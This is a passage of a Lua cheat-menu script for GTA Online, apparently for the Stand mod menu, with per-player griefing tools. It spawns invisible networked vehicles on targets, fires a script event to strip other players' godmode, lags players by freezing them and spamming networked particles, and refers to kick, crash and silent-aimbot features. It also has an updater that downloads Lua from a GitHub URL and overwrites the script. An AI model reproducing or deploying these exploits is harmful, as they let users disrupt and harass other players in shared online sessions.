            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("Spawned with index of " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)

    --preload

    menu.slider(playpan, "Number of fried fish.", {"friedfish"}, "The number of flippity flops", 1, 300, 20, 1, function(value)
        Ptools_FishPan = value
    end)

    menuAction(playpan, "Remove Pan.", {"rmpan"}, "Yep", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                wait(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        noNeedModel(util.joaat("tug"))
    end)

    local gmtool = menu.list(playerTools, "Godmode Tools")

    menuAction(gmtool, "God Check", {"godcheck"}, "", function()
        if (players.is_godmode(pid) and not players.is_in_interior(pid)) then
            util.toast(players.get_name(pid) .. " is in godmode!")
        elseif (players.is_in_interior(pid)) then
            util.toast(players.get_name(pid) .. " is in an interior!")
        else
            util.toast(players.get_name(pid) .. " is not in godmode!")
        end
    end)

    menuToggleLoop(gmtool, "Remove Player Godmode (BETA)", {"rmgod"}, "Removes the player's godmode, if they're not on a good paid menu.", function ()
        util.trigger_script_event(1 << pid, {801199324, pid, 869796886})
    end)

    menuToggleLoop(gmtool, "Remove Player Vehicle Godmode", {"rmvehgod"}, "Removes the player's vehicle godmode, recursively.", function()
        local ped = getPlayerPed(pid)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) and not PED.IS_PED_DEAD_OR_DYING(ped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(veh, true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh, false)
        end
    end)

    menuAction(playerTools, "Smooth Teleport", {"stp"}, "Smooth-Teleport to player. If they are in a vehicle, it smooth-teleports into their vehicle.", function()
        local targetPed = getPlayerPed(pid)
        local targetCoords = getEntityCoords(targetPed)
        if not PED.IS_PED_IN_ANY_VEHICLE(targetPed, true) then
            SmoothTeleportToCord(targetCoords)
        else
            SmoothTeleportToVehicle(targetPed)
        end
    end)

    ----------------------------------------------------------------------------

local kicks = menu.list(playerMain, "Kicks")
local crashes = menu.list(playerMain, "Crashes")

local crashdivid = menu.divider(crashes, "All moved to Crash Tab in Player List")

    ----------------------------------------------------------------------------

    local function request_ptfx_asset(asset)
        STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
    
        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
            util.yield()
        end
    end

    local lagplay = menu.list(playerMain, "Lagger", {}, "")

    menu.divider(lagplay, "!! DONT SPECTATE !!")

    menu.toggle_loop(lagplay, "Fire particles.", {"rlag"}, "Freeze the player in order for it to work.", function()
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Electricity particles.", {"rlag2"}, "Freeze the player in order for it to work.", function()
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Extinguish particles.", {"rlag3"}, "Freeze the player in order for it to work.", function()
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Dirt particles.", {"rlag4"}, "Freeze the player in order for it to work.", function()
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Tank particles.", {"rlag4"}, "Freeze the player in order for it to work.", function()
        if players.exists(pid) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(pid), "Trolling>Freeze")
            local player_pos = players.get_position(pid)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    ----------------------------------------------------------------------------
    
    local playset = menu.list(playerMain, "Settings")

    menuToggle(playset, "Blacklist from Silent Aimbot", {"aimblacklist"}, "Blacklists the selected player from silent aimbot.", function(on)
        if on then
            AIM_WHITELIST[pid] = true
        else
            AIM_WHITELIST[pid] = false
        end
    end)

    menuToggle(playset, "Blacklist from Auto Car-Suicide", {"carbombblacklist"}, "Blacklists the selected player from flagging a Car Suicide Explosion.", function(on)
        if on then
            CAR_S_BLACKLIST[pid] = true
        else
            CAR_S_BLACKLIST[pid] = false
        end
    end)

end

local notifytest = menu.list(mainsettings, "Notification Color Test")

notifytest:action("Normal (Black) Notification", {}, "", function()
    notification.normal("Normal Notification")
end)

notifytest:action("Red Notification", {}, "", function()
    notification.red("Red Notification")
end)

notifytest:action("Light Blue Notification", {}, "", function()
    notification.lightblue("Light Blue Notification")
end)

notifytest:action("Light Red Notification", {}, "", function()
    notification.lightred("Light Red Notification")
end)

notifytest:action("Grey Notification", {}, "", function()
    notification.grey("Grey Notification")
end)

notifytest:action("White Notification", {}, "", function()
    notification.white("White Notification")
end)

notifytest:action("Purple Notification", {}, "", function()
    notification.purple("Purple Notification")
end)

notifytest:action("Dark Purple Notification", {}, "", function()
    notification.darkpurple("Dark Purple Notification")
end)

notifytest:action("Pink Notification", {}, "", function()
    notification.pink("Pink Notification")
end)

notifytest:action("Dark Green Notification", {}, "", function()
    notification.darkgreen("Dark Green Notification")
end)

notifytest:action("Yellow Notification", {}, "", function()
    notification.yellow("Yellow Notification")
end)

mainsettings:action("Check for updates", {"updcheck"}, "Checks for updates from the github", function()
    async_http.init("raw.githubusercontent.com", '/N0mbyy/nuhuh/main/NuhUh', function(output)
        githubVersion = tonumber(output)
        response = true
        if myVersion ~= githubVersion then
            util.toast("Stand Expension updated to " ..githubVersion.. ". Update the lua to get the latest version :D")
            menu.action(mainsettings, "Update Lua", {}, "", function()
                async_http.init('raw.githubusercontent.com','/N0mbyy/nuhuh/main/1%20Nuh%20Uh.lua',function(a)
                    local err = select(2,load(a))
                    if err then
                        util.toast("Script failed to download. Please try again later. If this continues to happen then manually update via github.")
                    return end
                    local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                    f:write(a)
                    f:close()
                    util.toast("Successfully updated! Restarted the lua for the update to apply <3")
                    util.stop_script()
                end)
                async_http.dispatch()
            end)
        end
    end, function() response = true end)
    async_http.dispatch()
    repeat 
        util.yield()
    until response 
    end)

----------------------------------------------

util.on_stop(function()
    if duke_ped ~= nil then 
        entities.delete(duke_ped)
    end
    if milkie_ped ~= nil then 
        entities.delete(milkie_ped)
    end
    if chop_ped ~= nil then 
        entities.delete(chop_ped)
    end
    if rhesus_ped ~= nil then 
        entities.delete(rhesus_ped)
    end
    if rat_ped ~= nil then 
        entities.delete(rat_ped)
    end
    if nudy_ped ~= nil then 
        entities.delete(nudy_ped)
    end
end)

players.on_join(playerActionsSetup)
players.dispatch_on_join()
players.add_command_hook(set_up_player_actions)